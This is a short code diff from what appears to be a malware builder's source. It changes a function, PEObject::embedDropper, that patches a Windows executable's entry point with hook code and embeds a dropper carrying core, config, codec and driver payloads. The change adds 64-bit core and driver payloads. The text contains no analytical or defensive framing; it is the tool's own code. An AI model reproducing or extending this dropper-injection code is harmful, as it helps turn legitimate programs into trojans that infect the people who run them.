@@ -1062,7 +1062,7 @@ bool PEObject::_parseText()
 
 #define OFFSET(x, y) (((DWORD)x) - ((DWORD)y))
 
-bool PEObject::embedDropper( bf::path core, bf::path config, bf::path codec, bf::path driver, std::string installDir, bool fixManifest )
+bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, bool fixManifest )
 {
 	DWORD OEP = ntHeaders()->OptionalHeader.AddressOfEntryPoint;
 	GenericSection* epSection = findSection(OEP);
@@ -1090,7 +1090,7 @@ bool PEObject::embedDropper( bf::path core, bf::path config, bf::path codec, bf:
 	dropper.setPatchCode(0, _hookPointer.stage1.va, _hookPointer.stage1.ptr, 5);
 	dropper.setPatchCode(1, _hookPointer.stage2.va, _hookPointer.stage2.ptr, 5);
 	
-	if ( false == dropper.build(core, config, codec, driver, installDir) )
+	if ( false == dropper.build(core, core64, config, codec, driver, driver64, installDir) )
 		throw std::exception("Dropper build failed.");
 	
 	// base size is original resource section
